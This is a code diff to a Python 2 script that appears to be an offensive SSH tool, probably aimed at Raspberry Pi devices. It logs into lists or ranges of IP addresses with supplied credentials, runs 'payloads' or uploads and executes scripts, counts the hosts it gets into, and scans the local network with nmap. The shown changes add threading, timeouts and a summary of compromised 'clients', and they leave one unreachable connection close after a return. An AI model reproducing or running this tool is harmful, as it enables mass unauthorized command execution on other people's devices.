@@ -46,9 +46,13 @@ payloads = {
     "uname": "uname -a",
     "iplogger": "curl http://ipinfo.io/ip"
 }
+startTime = time.time()
+SshClients = []
+threadLock = threading.Lock()
 
 def main():
     PrintBanner()
+    
     if args.list:
         for payload, description in payloads.items():
             print colored("[" + payload + "]:", "yellow") + " " + description
@@ -92,34 +96,39 @@ def main():
         Targets = open(args.file, "r").read().split("\n")
         Targets.pop()
         SendPayloadRange(Targets, payload)
+    if len(SshClients) > 1:
+        print colored("Found ", "green") + colored(str(len(SshClients)), "yellow") + colored(" clients:", "green")
+    else:
+        print colored("Found ", "green") + colored(str(len(SshClients)), "yellow") + colored(" client:", "green")
+    for client in SshClients:
+        cprint(client, "yellow")
 
 def SendPayload(target, payload):
     if args.script:
-        ExecuteSshScript(target, args.port, args.username, args.password, os.path.basename(args.script), args.script)
+        if ExecuteSshScript(target, args.port, args.username, args.password, os.path.basename(args.script), args.script):
+            SshClients.append(target)
     else:
-        ExecuteSshCommand(target, args.port, args.username, args.password, payload)
+        if ExecuteSshCommand(target, args.port, args.username, args.password, payload):
+            SshClients.append(target)
 
 def ExecuteSshCommand(target, port, username, password, payload):
     SSHClient = paramiko.SSHClient()
     SSHClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        SSHClient.connect(hostname=target, port=port, username=username, password=password)
-        print colored("-" * 33 + "{", SuccessColor) +  colored(target, SuccessColor, attrs=["bold"]) +  colored("}" + "-" * (40-len(target)), SuccessColor)
+        SSHClient.connect(hostname=target, port=port, username=username, password=password, timeout=10)
         stdin, stdout, stderr = SSHClient.exec_command(payload)
-        print colored("Executed payload: ", SuccessColor, attrs=["bold"]) + payload
-        print ""
-        for line in stdout.readlines():
-            print line
+        PrintSshStatus(target, True, payload, stdout.readlines())
+        SSHClient.close()
+        return True
     except:
-        print colored("-" * 33 + "{" + target + "}" + "-" * (40-len(target)), FailedColor)
-        cprint("Authentication failed", FailedColor, attrs=["bold"])
-        print ""
-    SSHClient.close()
+        PrintSshStatus(target, False, payload)
+        SSHClient.close()
+        return False
 def ExecuteSshScript(target, port, username, password, fileName, filePath):
     SSHClient = paramiko.SSHClient()
     SSHClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        SSHClient.connect(target, port, username, password)
+        SSHClient.connect(target, port, username, password, timeout=10)
         print colored("-" * 33 + "{", SuccessColor) +  colored(target, SuccessColor, attrs=["bold"]) +  colored("}" + "-" * (40-len(target)), SuccessColor)
         SFTPClient = SSHClient.open_sftp()
         remoteFile = SFTPClient.open("/home/pi/" + fileName, mode="w")
@@ -130,12 +139,27 @@ def ExecuteSshScript(target, port, username, password, fileName, filePath):
         print colored("Executed script: ", SuccessColor, attrs=["bold"]) + filePath
         for line in stdout.readlines():
             print line
-
-            
+        SSHClient.close()
+        return True
     except:
         cprint("Authentication failed", FailedColor, attrs=["bold"])
         print ""
-    SSHClient.close()
+        return False
+        SSHClient.close()
+
+def PrintSshStatus(target, isSuccess, payload, output=""):
+    threadLock.acquire()
+    if isSuccess:
+        print colored("-" * 33 + "{", SuccessColor) +  colored(target, SuccessColor, attrs=["bold"]) +  colored("}" + "-" * (40-len(target)), SuccessColor)
+        print colored("Executed payload: ", SuccessColor, attrs=["bold"]) + payload
+        print ""
+        for line in output:
+            print line
+    else:
+        print colored("-" * 33 + "{" + target + "}" + "-" * (40-len(target)), FailedColor)
+        cprint("Authentication failed", FailedColor, attrs=["bold"])
+        print ""
+    threadLock.release()
 
 def SendPayloadRange(IpList, payload):
     threads = []
@@ -146,6 +170,8 @@ def SendPayloadRange(IpList, payload):
         thread.start()
     for thread in threads:
         thread.join()
+    print colored("Took: ", "green") + colored(str((time.time() - startTime)), "yellow") + colored(" seconds", "green")
+    print ""
 
 def ScanLocalNetwork(ip):
     scanner = nmap.PortScanner()
